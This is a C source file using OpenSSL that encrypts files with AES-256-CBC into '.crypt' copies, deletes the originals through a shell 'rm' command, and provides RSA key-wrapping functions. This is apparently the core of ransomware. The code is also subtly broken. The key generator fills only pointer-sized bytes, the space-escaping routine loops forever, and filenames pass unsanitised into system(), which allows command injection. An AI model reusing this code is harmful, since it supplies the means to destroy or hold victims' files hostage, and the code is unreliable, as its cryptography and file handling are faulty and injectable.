#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "crypto.h"

#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16

#define BUFSIZE 1024

struct Params{
    int a;
    unsigned char *key;
    FILE *plaintext;
    FILE *out;
    unsigned char *IV;
    int encrypt;
    const EVP_CIPHER *cipher;
};

typedef struct Params Params;

void nk(unsigned char *k){
    RAND_bytes(k, sizeof(k));
}

void cipher(Params *p){


    int cipher_block_size = EVP_CIPHER_block_size(p->cipher);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];

    int num_bytes_read = 100000, out_len;
    EVP_CIPHER_CTX *ctx;

    ctx = EVP_CIPHER_CTX_new();

    EVP_CipherInit_ex(ctx, p->cipher, NULL, NULL, NULL, p->encrypt);

    if(p->encrypt == 1)
        fwrite(p->IV, sizeof(unsigned char), AES_BLOCK_SIZE, p->out);
    else
        fread(p->IV, sizeof(unsigned char), AES_BLOCK_SIZE, p->plaintext);

    EVP_CipherInit_ex(ctx, NULL, NULL, p->key, p->IV, p->encrypt);

    while(num_bytes_read >= BUFSIZE){

        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, p->plaintext);
        EVP_CipherUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read);
        fwrite(out_buf, sizeof(unsigned char), out_len, p->out);

    }

    EVP_CipherFinal_ex(ctx, out_buf, &out_len);
    fwrite(out_buf, sizeof(unsigned char), out_len, p->out);
    EVP_CIPHER_CTX_cleanup(ctx);
    free(ctx);
}

void prepare(char *name){
    char *p; int pos;
    p = strchr(name, ' ');
    while(p){
        pos = name - p;
        strcpy(name + pos + 1, name + pos);
        name[pos] = '\\';
    }
}

void encryptAES(char *in, unsigned char *key){

    Params *p = (Params *) malloc (sizeof(Params));
    unsigned char Iv[AES_BLOCK_SIZE];
    RAND_bytes(Iv, sizeof(Iv));

    p->key = key;
    p->IV = Iv;
    p->cipher = EVP_aes_256_cbc();

    char out[2000]="";
    strcpy(out, in);
    strcat(out, ".crypt");
    FILE *In = fopen(in, "rb");
    FILE *Out = fopen(out, "wb");
    char message[2000];
    strcpy(message, "rm '");
    strcat(message, in);
    strcat(message, "'");

    p->plaintext = In;
    p->out = Out;
    p->encrypt = 1;

    cipher(p);

    fclose(In);
    system(message);
    fclose(Out);

    free(p);
}

void decryptAES(char *in, unsigned char *key){

    Params *p = (Params *) malloc (sizeof(Params));
    //unsigned char Iv[AES_BLOCK_SIZE];
    //RAND_bytes(Iv, sizeof(Iv));

    p->key = key;
    p->IV = (unsigned char *) malloc (sizeof(unsigned char) * AES_BLOCK_SIZE);
    p->cipher = EVP_aes_256_cbc();

    char out[2000]="";
    strcpy(out, in);
    int len = strlen(out);
    strcpy(out + len - 6, out + len);
    char message[2000];
    /*strcpy(message, "touch ");
    strcat(message, out);
    system(message);*/
    FILE *In = fopen(in, "rb");
    FILE *Out = fopen(out, "wb");
    strcpy(message, "rm '");
    strcat(message, in);
    strcat(message, "'");
    p->plaintext = In;
    p->out = Out;
    p->encrypt = 0;

    cipher(p);

    fclose(In);
    system(message);
    fclose(Out);
    free(p->IV);
    free(p);
}

RSA *createRSA(unsigned char *key, bool public){

    RSA *rsa;
    BIO *keybio;
    keybio = BIO_new_mem_buf(key, -1);
    if(public)
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    else
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    return rsa;
}

void public_encrypt(unsigned char *text, int len, unsigned char *key, unsigned char *encrypted){

    RSA *rsa = createRSA(key, true);
    RSA_public_encrypt(len, text, encrypted, rsa, RSA_PKCS1_PADDING);
}

void private_decrypt(unsigned char * encText, int len,unsigned char *key, unsigned char *decrypted){

    RSA *rsa = createRSA(key, false);
    RSA_private_decrypt(len, encText, decrypted, rsa, RSA_PKCS1_PADDING);
}
